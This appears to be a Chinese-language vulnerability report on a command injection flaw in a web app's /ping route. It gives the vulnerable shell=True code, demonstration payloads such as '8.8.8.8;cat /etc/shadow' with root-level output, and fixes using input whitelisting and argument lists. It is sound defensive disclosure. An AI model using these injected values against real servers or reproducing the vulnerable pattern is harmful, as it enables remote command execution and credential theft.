1. 报告概述

1.1 本轮背景

系统新增了Ping 网络诊断功能（/ping），使用 f"ping -c 3 {ip}" 拼接命令并以 shell=True 执行。攻击者可在 IP 参数中添加 ;、| 等分隔符执行任意系统命令，实现远程代码执行（RCE）。

1.2 什么是命令注入？

命令注入（Command Injection）攻击者将恶意命令注入到系统命令的参数中。当应用使用 shell 执行拼接后的字符串时，分隔符后的命令也会被执行。这是最危险的 Web 漏洞之一，可导致服务器完全被控。

VULN-25：Ping 命令注入（RCE）🔴 严重

位置：/ping — POST 路由

漏洞代码：

ip = request.form.get("ip", "")
cmd = f"ping -c 3 {ip}"  ← f-string 拼接，无过滤
subprocess.check_output(cmd, shell=True)  ← shell=True 执行

描述：IP 参数直接拼入命令，攻击者可添加 ;cat /etc/passwd 等后缀执行任意命令。

VULN-26：远程代码执行🔴 严重

描述：利用命令注入可执行：id（查用户身份）、cat /etc/passwd（读系统文件）、ifconfig（看网络配置）、ls -la（看目录）

攻击场景：输入 8.8.8.8;cat /etc/shadow → ping 结束后执行 cat → 密码哈希泄露

3. 攻击演示

3.1 执行系统命令

📌 攻击请求
POST /ping ip=8.8.8.8;id

😱 实际执行的系统命令
ping -c 3 8.8.8.8;id

结果
uid=0(root) ← root 权限！

3.2 读取敏感文件

📌 攻击请求
POST /ping ip=8.8.8.8;cat /etc/passwd

结果
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
✅ 系统用户列表泄露

3.3 其他恶意操作

📌 攻击 Payload 汇总
8.8.8.8;whoami    → root
127.0.0.1;ls -la  → 目录列表
8.8.8.8;ifconfig → 网络配置
8.8.8.8;cat /etc/shadow → 密码哈希

4. 修复方案

4.1 输入白名单校验

import re
if not re.match(r'^[a-zA-Z0-9.\-]+$', ip):
  result = "包含非法字符，只允许 IP 地址或域名"

4.2 禁止 shell 执行

cmd = ["ping", "-c", "3", ip]  # 参数列表
subprocess.check_output(cmd, shell=False)  # 禁止 shell

5. 修复前后对照

❌ 修复前
f"ping -c 3 {ip}"
shell=True

→ 8.8.8.8;id ✅ 可执行
→ 远程命令执行成功
✅ 修复后

["ping","-c","3",ip]

→ 8.8.8.8;id 🚫 被拦截
→ 攻击失败
